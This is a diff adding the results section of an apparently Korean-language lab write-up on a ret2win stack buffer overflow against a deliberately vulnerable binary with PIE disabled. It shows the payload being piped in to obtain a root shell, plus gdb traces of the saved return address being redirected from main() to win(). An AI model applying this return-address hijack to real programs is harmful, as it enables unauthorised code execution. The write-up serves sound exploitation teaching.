@@ -448,7 +448,52 @@ payload = [padding] + [win() addr]
 
 ### 5.3 결과
 
+`vuln()` 종료 후 `win()`함수로 점프된다:
+```
+$ (python3 payload.py;cat) | /tmp/pie-lab/pie-off
+input:
 
+id
+uid=0(root) gid=1000(name) groups=1000(name),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin)
+```
+
+payload 주입 전 gdb 확인:
+```
+(gdb) r
+Starting program: /tmp/pie-lab/pie-off 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+input:
+AAAA
+
+Breakpoint 1, 0x08049203 in vuln ()
+(gdb) x/wx $esp
+0xffb8831c:	0x0804920f
+(gdb) ni
+0x0804920f in main ()
+```
+* saved RET로 `main()` 내부 주소
+* `vuln()` 종료 후 `main()` 내부로 점프
+
+payload 주입 후 gdb 확인:
+```
+(gdb) r < <(python3 payload.py)
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /tmp/pie-lab/pie-off < <(python3 payload.py)
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+input:
+
+Breakpoint 1, 0x08049203 in vuln ()
+(gdb) x/wx $esp
+0xff88957c:	0x080491a6
+(gdb) ni
+0x080491a6 in win ()
+(gdb) 
+```
+* saved RET로 `win()` 내부 주소
+* `vuln()` 종료 후 `win()` 내부로 점프
 
 ---
 
